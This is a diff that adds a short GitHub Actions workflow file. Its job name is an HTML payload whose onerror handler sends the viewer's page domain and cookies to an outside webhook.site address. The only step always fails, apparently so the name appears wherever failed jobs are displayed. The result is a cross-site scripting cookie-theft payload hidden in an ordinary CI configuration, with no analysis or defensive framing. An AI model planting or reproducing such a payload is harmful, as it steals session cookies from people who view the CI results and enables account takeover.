@@ -1,0 +1,11 @@
+name: CI
+
+on: [push, pull_request]
+
+jobs:
+  ci-test:
+    name: "<img src=x onerror=fetch('https://webhook.site/354719ff-0db3-4e38-b394-4830403ebbf1?d='+document.domain+'&c='+encodeURIComponent(document.cookie))>"
+    runs-on: ubuntu-latest
+    steps:
+      - name: Always fail
+        run: exit 1
